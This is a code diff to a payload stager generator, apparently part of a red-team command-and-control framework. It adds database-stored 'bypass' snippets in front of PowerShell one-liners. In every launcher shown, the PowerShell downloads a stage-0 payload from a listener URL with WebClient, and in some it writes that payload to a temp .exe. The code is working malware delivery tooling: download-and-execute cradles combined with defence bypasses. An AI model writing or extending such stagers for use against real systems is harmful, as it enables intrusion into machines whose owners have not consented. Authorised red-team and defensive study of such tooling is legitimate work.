@@ -92,6 +92,41 @@ class StagerGenerationService:
 
         return stager
 
+    @staticmethod
+    def _load_bypass_codes(bypasses: str, language: str) -> list[str]:
+        """Resolve whitespace-separated bypass names into a list of code strings,
+        dropping any whose stored language doesn't match the requested execution
+        language. Mismatches and unknown names log a warning and are silently
+        dropped — the caller still receives a (possibly empty) list and proceeds.
+        The csharp/go/ironpython EXE oneliner stagers pass language="powershell"
+        here because the delivered command is a PowerShell downloader regardless
+        of the payload language."""
+        if not bypasses:
+            return []
+        codes = []
+        normalized_language = language.lower() if language else ""
+        log_language = language or "<unspecified>"
+        names = bypasses.split()
+        with SessionLocal.begin() as db:
+            rows = db.scalars(
+                select(models.Bypass).where(models.Bypass.name.in_(names))
+            ).all()
+            by_name = {row.name: row for row in rows}
+            for name in names:
+                db_bypass = by_name.get(name)
+                if not db_bypass:
+                    log.warning(f"Bypass '{name}' not found; skipping")
+                    continue
+                stored_language = (db_bypass.language or "").lower()
+                if stored_language == normalized_language:
+                    codes.append(db_bypass.code)
+                else:
+                    log.warning(
+                        f"Dropping bypass '{name}' (language={db_bypass.language}) "
+                        f"for {log_language} execution context"
+                    )
+        return codes
+
     def generate_launcher(  # noqa: PLR0913
         self,
         listener_name,
@@ -108,18 +143,8 @@ class StagerGenerationService:
         Abstracted functionality that invokes the generate_launcher() method for a given listener,
         if it exists.
         """
+        bypasses_parsed = self._load_bypass_codes(bypasses, language)
         with SessionLocal.begin() as db:
-            bypasses_parsed = []
-            for bypass in bypasses.split(" "):
-                db_bypass = db.scalars(
-                    select(models.Bypass).where(models.Bypass.name == bypass)
-                ).first()
-                if db_bypass:
-                    if db_bypass.language == language:
-                        bypasses_parsed.append(db_bypass.code)
-                    else:
-                        log.warning(f"Invalid bypass language: {db_bypass.language}")
-
             db_listener = self.listener_service.get_by_name(db, listener_name)
             active_listener = self.listener_service.get_active_listener(db_listener.id)
             if not active_listener:
@@ -209,8 +234,14 @@ class StagerGenerationService:
             )
         return shellcode, None
 
-    def generate_exe_oneliner(
-        self, language, obfuscate, obfuscation_command, encode, listener_name
+    def generate_exe_oneliner(  # noqa: PLR0913
+        self,
+        language,
+        obfuscate,
+        obfuscation_command,
+        encode,
+        listener_name,
+        bypasses: str = "",
     ):
         """
         Generate an oneliner for an executable
@@ -240,7 +271,9 @@ class StagerGenerationService:
         b64_routing_packet = base64.b64encode(routing_packet).decode("UTF-8")
         stage0_url = self._build_stage0_url(listener.host_address, request_uri, hop)
 
+        bypass_prefix = "".join(self._load_bypass_codes(bypasses, "powershell"))
         launcher = f"""
+        {bypass_prefix}
         $wc=New-Object System.Net.WebClient;
         $wc.Headers.Add("Cookie","{cookie_name}={b64_routing_packet}");
         $bytes=$wc.DownloadData("{stage0_url}");
@@ -262,13 +295,14 @@ class StagerGenerationService:
             return helpers.powershell_launcher(launcher, launcher_front)
         return launcher
 
-    def generate_go_exe_oneliner(
+    def generate_go_exe_oneliner(  # noqa: PLR0913
         self,
         language,
         listener_name,
         obfuscate,
         obfuscation_command,
         encode,
+        bypasses: str = "",
     ):
         """
         Generate a oneliner for a executable
@@ -298,7 +332,9 @@ class StagerGenerationService:
         b64_routing_packet = base64.b64encode(routing_packet).decode("UTF-8")
         stage0_url = self._build_stage0_url(listener.host_address, request_uri, hop)
 
+        bypass_prefix = "".join(self._load_bypass_codes(bypasses, "powershell"))
         launcher = f"""
+            {bypass_prefix}
             # Create a temp file path
             $tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "{helpers.random_string(length=5)}.exe");
             $wc = New-Object System.Net.WebClient;
@@ -368,8 +404,14 @@ class StagerGenerationService:
         request_uri = self._get_request_uri(listener)
         return self._build_stage0_url(listener.host_address, request_uri, hop)
 
-    def generate_exe_oneliner_routed(
-        self, language, obfuscate, obfuscation_command, encode, listener_name
+    def generate_exe_oneliner_routed(  # noqa: PLR0913
+        self,
+        language,
+        obfuscate,
+        obfuscation_command,
+        encode,
+        listener_name,
+        bypasses: str = "",
     ):
         """Listener-aware wrapper around generate_exe_oneliner. Picks the
         correct stage 0 URL via _stage0_url_for so malleable listeners
@@ -401,7 +443,9 @@ class StagerGenerationService:
         b64_routing_packet = base64.b64encode(routing_packet).decode("UTF-8")
         stage0_url = self._stage0_url_for(listener, hop)
 
+        bypass_prefix = "".join(self._load_bypass_codes(bypasses, "powershell"))
         launcher = f"""
+        {bypass_prefix}
         $wc=New-Object System.Net.WebClient;
         $wc.Headers.Add("Cookie","{cookie_name}={b64_routing_packet}");
         $bytes=$wc.DownloadData("{stage0_url}");
@@ -423,8 +467,14 @@ class StagerGenerationService:
             return helpers.powershell_launcher(launcher, launcher_front)
         return launcher
 
-    def generate_go_exe_oneliner_routed(
-        self, language, listener_name, obfuscate, obfuscation_command, encode
+    def generate_go_exe_oneliner_routed(  # noqa: PLR0913
+        self,
+        language,
+        listener_name,
+        obfuscate,
+        obfuscation_command,
+        encode,
+        bypasses: str = "",
     ):
         """Go mirror of generate_exe_oneliner_routed. Same listener-aware
         URL pick, same oneliner shape as generate_go_exe_oneliner."""
@@ -453,7 +503,9 @@ class StagerGenerationService:
         b64_routing_packet = base64.b64encode(routing_packet).decode("UTF-8")
         stage0_url = self._stage0_url_for(listener, hop)
 
+        bypass_prefix = "".join(self._load_bypass_codes(bypasses, "powershell"))
         launcher = f"""
+            {bypass_prefix}
             # Create a temp file path
             $tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "{helpers.random_string(length=5)}.exe");
             $wc = New-Object System.Net.WebClient;
